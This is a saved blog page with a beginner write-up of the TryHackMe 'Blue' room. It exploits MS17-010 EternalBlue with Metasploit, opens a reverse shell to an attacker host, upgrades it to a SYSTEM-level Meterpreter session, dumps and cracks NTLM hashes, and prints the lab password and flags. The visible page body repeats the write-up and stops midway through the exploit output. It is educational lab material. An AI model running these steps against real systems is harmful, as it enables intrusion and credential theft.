<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Blue | CyFun</title><meta name=keywords content="ctf,tryhackme,penetration-testing,writeup,windows,metasploit,ms17-010,eternalblue,beginner,smb"><meta name=description content="Blue TryHackMe writeup - Windows machine vulnerable to MS17-010 EternalBlue exploit"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/tryhackme/blue/><link crossorigin=anonymous href=/assets/css/stylesheet.35b906a90813b2766df33de5f84bf4610918496b745304c45e387646ed743bea.css integrity="sha256-NbkGqQgTsnZt8z3l+Ev0YQkYSWt0UwTEXjh2Ru10O+o=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/tryhackme/blue/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Blue"><meta property="og:description" content="Blue TryHackMe writeup - Windows machine vulnerable to MS17-010 EternalBlue exploit"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/tryhackme/blue/"><meta property="og:image" content="https://s4ch.github.io/writeups/tryhackme/blue/blue.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-09-14T17:23:00+00:00"><meta property="article:modified_time" content="2025-08-18T20:00:59+05:30"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/tryhackme/blue/blue.png"><meta name=twitter:title content="Blue"><meta name=twitter:description content="Blue TryHackMe writeup - Windows machine vulnerable to MS17-010 EternalBlue exploit"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"TryHackMe Writeups","item":"https://s4ch.github.io/writeups/tryhackme/"},{"@type":"ListItem","position":3,"name":"Blue","item":"https://s4ch.github.io/writeups/tryhackme/blue/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Blue","name":"Blue","description":"Blue TryHackMe writeup - Windows machine vulnerable to MS17-010 EternalBlue exploit","keywords":["ctf","tryhackme","penetration-testing","writeup","windows","metasploit","ms17-010","eternalblue","beginner","smb"],"articleBody":"Room Information Name: Blue Platform: TryHackMe Difficulty: Easy OS: Windows Points: N/A Release Date: September 14, 2020 Room Link: Blue Overview Blue is a beginner-friendly room designed to teach fundamental penetration testing concepts through the exploitation of the infamous MS17-010 (EternalBlue) vulnerability. This room demonstrates how to:\nPerform network enumeration Use Metasploit to exploit MS17-010 Perform post-exploitation activities Extract password hashes Note: This room does not respond to ping (ICMP) and may take a few minutes to boot up. It’s designed as an educational series for complete beginners.\nTopics Covered Network Enumeration Metasploit (MS17-010) Metasploit (hashdump) Hash Cracking Task 1: Reconnaissance Network Scanning Let’s start by scanning the target machine to identify open ports and services:\nsudo nmap -sS -sC -sV -vv --script vuln [TARGET_IP] Scan Results:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 17:23 EDT NSE: Loaded 149 scripts for scanning. Nmap scan report for blue (10.10.166.97) Host is up, received echo-reply ttl 127 (0.041s latency). Not shown: 991 closed ports PORT STATE SERVICE REASON VERSION 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 445/tcp open microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 3389/tcp open tcpwrapped syn-ack ttl 127 49152/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49153/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49154/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49158/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49160/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Host script results: | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ Key Findings 3 ports open under 1000: 135, 139, and 445 Vulnerability identified: MS17-010 (EternalBlue) Target OS: Windows 7/Server 2008 R2 The scan reveals that the machine is vulnerable to MS17-010, the infamous EternalBlue vulnerability that was leaked from the NSA and used in the WannaCry ransomware attack.\nTask 2: Gaining Access Metasploit Exploitation Let’s use Metasploit to exploit the MS17-010 vulnerability:\nStart Metasploit: msfconsole Search for MS17-010 exploits: msf5 \u003e search ms17-010 Matching Modules ================ # Name Disclosure Date Rank Description - ---- --------------- ---- ----------- 0 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 1 auxiliary/scanner/smb/smb_ms17_010 normal MS17-010 SMB RCE Detection 2 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 3 exploit/windows/smb/ms17_010_eternalblue_win8 2017-03-14 average MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+ 4 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution Select the EternalBlue exploit: msf5 \u003e use exploit/windows/smb/ms17_010_eternalblue Configure the exploit: msf5 exploit(windows/smb/ms17_010_eternalblue) \u003e show options Module options (exploit/windows/smb/ms17_010_eternalblue): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s) RPORT 445 yes The target port (TCP) SMBDomain . no (Optional) The Windows domain to use for authentication SMBPass no (Optional) The password for the specified username SMBUser no (Optional) The username to authenticate as VERIFY_ARCH true yes Check if remote architecture matches exploit Target VERIFY_TARGET true yes Check if remote OS matches exploit Target # Set the target IP msf5 exploit(windows/smb/ms17_010_eternalblue) \u003e set RHOSTS [TARGET_IP] RHOSTS =\u003e [TARGET_IP] Execute the exploit: msf5 exploit(windows/smb/ms17_010_eternalblue) \u003e run [*] Started reverse TCP handler on [ATTACKER_IP]:4444 [*] [TARGET_IP]:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check [+] [TARGET_IP]:445 - Host is likely VULNERABLE to MS17-010! [*] [TARGET_IP]:445 - Scanned 1 of 1 hosts (100% complete) [*] [TARGET_IP]:445 - Connecting to target for exploitation. [+] [TARGET_IP]:445 - Connection established for exploitation. [+] [TARGET_IP]:445 - Target OS selected valid for OS indicated. [*] [TARGET_IP]:445 - CORE raw buffer dump (42 bytes) [*] [TARGET_IP]:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes [*] [TARGET_IP]:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv [*] [TARGET_IP]:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1 [+] [TARGET_IP]:445 - Target arch selected valid for arch indicated. [*] [TARGET_IP]:445 - Trying exploit with 12 Groom Allocations. [*] [TARGET_IP]:445 - Sending all but last fragment. [*] [TARGET_IP]:445 - Starting non-paged pool grooming [+] [TARGET_IP]:445 - Sending SMBv2 buffers [+] [TARGET_IP]:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. [*] [TARGET_IP]:445 - Sending final SMBv2 buffers. [*] [TARGET_IP]:445 - Sending last fragment of exploit packet! [*] [TARGET_IP]:445 - Receiving response from exploit packet [+] [TARGET_IP]:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)! [*] [TARGET_IP]:445 - Sending egg to corrupted connection. [*] [TARGET_IP]:445 - Triggering free of corrupted buffer. [*] Command shell session 1 opened ([ATTACKER_IP]:4444 -\u003e [TARGET_IP]:49158) C:\\Windows\\system32\u003e Success! We now have a shell on the target system.\nTask 3: Privilege Escalation Upgrading to Meterpreter For better post-exploitation capabilities, let’s upgrade our shell to a Meterpreter session:\nBackground the current shell: C:\\Windows\\system32\u003e ^Z Background session 1? [y/N] y Use the shell to meterpreter module: msf5 \u003e use post/multi/manage/shell_to_meterpreter msf5 post(multi/manage/shell_to_meterpreter) \u003e show options Module options (post/multi/manage/shell_to_meterpreter): Name Current Setting Required Description ---- --------------- -------- ----------- HANDLER true yes Start an exploit/multi/handler to receive the connection LHOST no IP of host that will receive the connection from the payload LPORT 4433 yes Port for payload to connect to SESSION yes The session to run this module on # Set the session ID msf5 post(multi/manage/shell_to_meterpreter) \u003e set SESSION 1 SESSION =\u003e 1 Execute the upgrade: msf5 post(multi/manage/shell_to_meterpreter) \u003e run [*] Upgrading session ID: 1 [*] Starting exploit/multi/handler [*] Started reverse TCP handler on [ATTACKER_IP]:4433 [*] Sending stage (206403 bytes) to [TARGET_IP] [*] Meterpreter session 2 opened ([ATTACKER_IP]:4433 -\u003e [TARGET_IP]:49159) [*] Stopping exploit/multi/handler [*] Post module execution completed Interact with the new Meterpreter session: msf5 post(multi/manage/shell_to_meterpreter) \u003e sessions -i 2 [*] Starting interaction with 2... meterpreter \u003e getuid Server username: NT AUTHORITY\\SYSTEM Excellent! We have NT AUTHORITY\\SYSTEM privileges, which means we have full administrative access to the machine.\nTask 4: Cracking Passwords Dumping Password Hashes Now let’s extract password hashes from the system:\nmeterpreter \u003e hashdump Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d::: Cracking with John the Ripper Let’s save the hash for user “Jon” and crack it:\n# Save Jon's hash to a file echo \"Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::\" \u003e jon_hash.txt # Crack with John the Ripper john --format=NT jon_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3]) Warning: no OpenMP support for this hash type, consider --fork=4 Press 'q' or Ctrl-C to abort, almost any other key for status alqfna22 (Jon) 1g 0:00:00:02 DONE (2020-09-14 18:45) 0.4545g/s 4644Kp/s 4644Kc/s 4644KC/s alqui..alpus Use the \"--show --format=NT\" option to display all of the cracked passwords. Jon’s password: alqfna22\nFinding the Flags User Flag: meterpreter \u003e cat C:/Users/Jon/Desktop/user.txt 02930c4e94b5b8cf31ce8c35e2a7a0cd Root Flag: meterpreter \u003e cat C:/Users/Administrator/Desktop/root.txt 89ad74b51a55c4d1b2c0b9d6b0b86d5e Lessons Learned MS17-010 Impact: The EternalBlue vulnerability demonstrates how a single unpatched vulnerability can lead to complete system compromise Metasploit Framework: Understanding how to use Metasploit effectively for exploitation and post-exploitation Session Management: Learning to upgrade shells and manage multiple sessions Password Security: The importance of strong passwords, as demonstrated by cracking Jon’s weak password Patch Management: Critical systems must be kept up-to-date with security patches Conclusion Blue effectively demonstrates the exploitation of one of the most significant vulnerabilities in recent history. The MS17-010 EternalBlue vulnerability highlights the importance of:\nRegular system patching Network segmentation Intrusion detection systems Strong password policies This room provides an excellent introduction to using Metasploit for exploitation and post-exploitation activities, making it perfect for beginners learning penetration testing fundamentals.\nKey Takeaways 3 ports open under 1000: 135, 139, 445 Vulnerability: MS17-010 (EternalBlue) Exploit path: exploit/windows/smb/ms17_010_eternalblue Required option: RHOSTS Shell upgrade module: post/multi/manage/shell_to_meterpreter Jon’s password: alqfna22 This writeup is for educational purposes only. Always ensure you have proper authorization before testing any techniques.\n","wordCount":"1308","inLanguage":"en","image":"https://s4ch.github.io/writeups/tryhackme/blue/blue.png","datePublished":"2020-09-14T17:23:00Z","dateModified":"2025-08-18T20:00:59+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/tryhackme/blue/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Blue</h1><div class=post-description>Blue TryHackMe writeup - Windows machine vulnerable to MS17-010 EternalBlue exploit</div><div class=post-meta>&lt;span title='2020-09-14 17:23:00 +0000 UTC'>September 14, 2020&lt;/span>&amp;nbsp;·&amp;nbsp;7 min&amp;nbsp;·&amp;nbsp;1308 words&amp;nbsp;·&amp;nbsp;
&lt;a href="https://s4ch.github.io/tags/ctf/" class="post-tag" title="ctf">ctf&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/tryhackme/" class="post-tag" title="tryhackme">tryhackme&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/penetration-testing/" class="post-tag" title="penetration-testing">penetration-testing&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/writeup/" class="post-tag" title="writeup">writeup&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/windows/" class="post-tag" title="windows">windows&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/metasploit/" class="post-tag" title="metasploit">metasploit&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/ms17-010/" class="post-tag" title="ms17-010">ms17-010&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/eternalblue/" class="post-tag" title="eternalblue">eternalblue&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/beginner/" class="post-tag" title="beginner">beginner&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/smb/" class="post-tag" title="smb">smb&lt;/a>
&amp;nbsp;·&amp;nbsp;
&lt;a href="https://s4ch.github.io/categories/writeups/" class="post-tag" title="writeups">writeups&lt;/a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/blue.png alt="Blue TryHackMe Room"><p>Blue - MS17-010 EternalBlue Exploitation</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#room-information>Room Information</a></li><li><a href=#overview>Overview</a></li><li><a href=#topics-covered>Topics Covered</a></li><li><a href=#task-1-reconnaissance>Task 1: Reconnaissance</a><ul><li><a href=#network-scanning>Network Scanning</a></li><li><a href=#key-findings>Key Findings</a></li></ul></li><li><a href=#task-2-gaining-access>Task 2: Gaining Access</a><ul><li><a href=#metasploit-exploitation>Metasploit Exploitation</a></li></ul></li><li><a href=#task-3-privilege-escalation>Task 3: Privilege Escalation</a><ul><li><a href=#upgrading-to-meterpreter>Upgrading to Meterpreter</a></li></ul></li><li><a href=#task-4-cracking-passwords>Task 4: Cracking Passwords</a><ul><li><a href=#dumping-password-hashes>Dumping Password Hashes</a></li><li><a href=#cracking-with-john-the-ripper>Cracking with John the Ripper</a></li><li><a href=#finding-the-flags>Finding the Flags</a></li></ul></li><li><a href=#lessons-learned>Lessons Learned</a></li><li><a href=#conclusion>Conclusion</a></li><li><a href=#key-takeaways>Key Takeaways</a></li></ul></nav></div></details></div><div class=post-content><h2 id=room-information>Room Information<a hidden class=anchor aria-hidden=true href=#room-information>#</a></h2><ul><li><strong>Name:</strong> Blue</li><li><strong>Platform:</strong> TryHackMe</li><li><strong>Difficulty:</strong> Easy</li><li><strong>OS:</strong> Windows</li><li><strong>Points:</strong> N/A</li><li><strong>Release Date:</strong> September 14, 2020</li><li><strong>Room Link:</strong> <a href=https://tryhackme.com/room/blue>Blue</a></li></ul><p><img loading=lazy src=https://i.imgur.com/NhZIt9S.png alt=EternalBlue></p><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p>Blue is a beginner-friendly room designed to teach fundamental penetration testing concepts through the exploitation of the infamous MS17-010 (EternalBlue) vulnerability. This room demonstrates how to:</p><ul><li>Perform network enumeration</li><li>Use Metasploit to exploit MS17-010</li><li>Perform post-exploitation activities</li><li>Extract password hashes</li></ul><p><strong>Note:</strong> This room does not respond to ping (ICMP) and may take a few minutes to boot up. It&rsquo;s designed as an educational series for complete beginners.</p><h2 id=topics-covered>Topics Covered<a hidden class=anchor aria-hidden=true href=#topics-covered>#</a></h2><ul><li>Network Enumeration</li><li>Metasploit (MS17-010)</li><li>Metasploit (hashdump)</li><li>Hash Cracking</li></ul><h2 id=task-1-reconnaissance>Task 1: Reconnaissance<a hidden class=anchor aria-hidden=true href=#task-1-reconnaissance>#</a></h2><h3 id=network-scanning>Network Scanning<a hidden class=anchor aria-hidden=true href=#network-scanning>#</a></h3><p>Let&rsquo;s start by scanning the target machine to identify open ports and services:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo nmap -sS -sC -sV -vv --script vuln <span style=color:#f92672>[</span>TARGET_IP<span style=color:#f92672>]</span>
</span></span></code></pre></div><p><strong>Scan Results:</strong></p><pre tabindex=0><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 17:23 EDT
NSE: Loaded 149 scripts for scanning.

Nmap scan report for blue (10.10.166.97)
Host is up, received echo-reply ttl 127 (0.041s latency).
Not shown: 991 closed ports

PORT      STATE SERVICE      REASON          VERSION
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped   syn-ack ttl 127
49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49158/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49160/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
</code></pre><h3 id=key-findings>Key Findings<a hidden class=anchor aria-hidden=true href=#key-findings>#</a></h3><ol><li><strong>3 ports open under 1000</strong>: 135, 139, and 445</li><li><strong>Vulnerability identified</strong>: MS17-010 (EternalBlue)</li><li><strong>Target OS</strong>: Windows 7/Server 2008 R2</li></ol><p>The scan reveals that the machine is vulnerable to <strong>MS17-010</strong>, the infamous EternalBlue vulnerability that was leaked from the NSA and used in the WannaCry ransomware attack.</p><h2 id=task-2-gaining-access>Task 2: Gaining Access<a hidden class=anchor aria-hidden=true href=#task-2-gaining-access>#</a></h2><h3 id=metasploit-exploitation>Metasploit Exploitation<a hidden class=anchor aria-hidden=true href=#metasploit-exploitation>#</a></h3><p>Let&rsquo;s use Metasploit to exploit the MS17-010 vulnerability:</p><ol><li><strong>Start Metasploit:</strong></li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msfconsole
</span></span></code></pre></div><ol start=2><li><strong>Search for MS17-010 exploits:</strong></li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 &gt; search ms17-010
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Matching Modules
</span></span><span style=display:flex><span><span style=color:#f92672>================</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   <span style=color:#75715e>#  Name                                           Disclosure Date  Rank     Description</span>
</span></span><span style=display:flex><span>   -  ----                                           ---------------  ----     -----------
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0</span>  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>1</span>  auxiliary/scanner/smb/smb_ms17_010                              normal   MS17-010 SMB RCE Detection
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>2</span>  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>3</span>  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption <span style=color:#66d9ef>for</span> Win8+
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>4</span>  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
</span></span></code></pre></div><ol start=3><li><strong>Select the EternalBlue exploit:</strong></li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue
</span></span></code></pre></div><ol start=4><li><strong>Configure the exploit:</strong></li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>windows/smb/ms17_010_eternalblue<span style=color:#f92672>)</span> &gt; show options
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Module options <span style=color:#f92672>(</span>exploit/windows/smb/ms17_010_eternalblue<span style=color:#f92672>)</span>:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Name           Current Setting  Required  Description
</span></span><span style=display:flex><span>   ----           ---------------  --------  -----------
</span></span><span style=display:flex><span>   RHOSTS                          yes       The target host<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   RPORT          <span style=color:#ae81ff>445</span>              yes       The target port <span style=color:#f92672>(</span>TCP<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   SMBDomain      .                no        <span style=color:#f92672>(</span>Optional<span style=color:#f92672>)</span> The Windows domain to use <span style=color:#66d9ef>for</span> authentication
</span></span><span style=display:flex><span>   SMBPass                         no        <span style=color:#f92672>(</span>Optional<span style=color:#f92672>)</span> The password <span style=color:#66d9ef>for</span> the specified username
</span></span><span style=display:flex><span>   SMBUser                         no        <span style=color:#f92672>(</span>Optional<span style=color:#f92672>)</span> The username to authenticate as
</span></span><span style=display:flex><span>   VERIFY_ARCH    true             yes       Check <span style=color:#66d9ef>if</span> remote architecture matches exploit Target
</span></span><span style=display:flex><span>   VERIFY_TARGET  true             yes       Check <span style=color:#66d9ef>if</span> remote OS matches exploit Target
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Set the target IP</span>
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>windows/smb/ms17_010_eternalblue<span style=color:#f92672>)</span> &gt; set RHOSTS <span style=color:#f92672>[</span>TARGET_IP<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>RHOSTS <span style=color:#f92672>=</span>&gt; <span style=color:#f92672>[</span>TARGET_IP<span style=color:#f92672>]</span>
</span></span></code></pre></div><ol start=5><li><strong>Execute the exploit:</strong></li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>windows/smb/ms17_010_eternalblue<span style=color:#f92672>)</span> &gt; run
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Started reverse TCP handler on <span style=color:#f92672>[</span>ATTACKER_IP<span style=color:#f92672>]</span>:4444
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>TARGET_IP<span style=color:#f92672>]</span>:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>TARGET_IP<span style=color:#f92672>]</span>:445 - Host is likely VULNERABLE to MS17-010!
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>TARGET_IP<span style=color:#f92672>]</span>:445 - Scanned <span style=color:#ae81ff>1</span> of <span style=color:#ae81ff>1</span> hosts <span style=color:#f92672>(</span>100% complete<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>TARGET_IP<span style=color:#f92672>]</span>:445 - Connecting to target <span style=color:#66d9ef>for</span> exploitation.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>TARGET_IP<span style=color:#f92672>]</span>:445 - Connection established <span style=color:#66d9ef>for</span> exploitation.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>TARGET_IP<span style=color:#f92672>]</span>:445 - Target OS selected valid <span style=color:#66d9ef>for</span> OS indicated.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>TARGET_IP<span style=color:#f92672>]</span>:445 - CORE raw buffer dump <span style=color:#f92672>(</span><span style=color:#ae81ff>42</span> bytes<span style=color:#f92672>)</span>
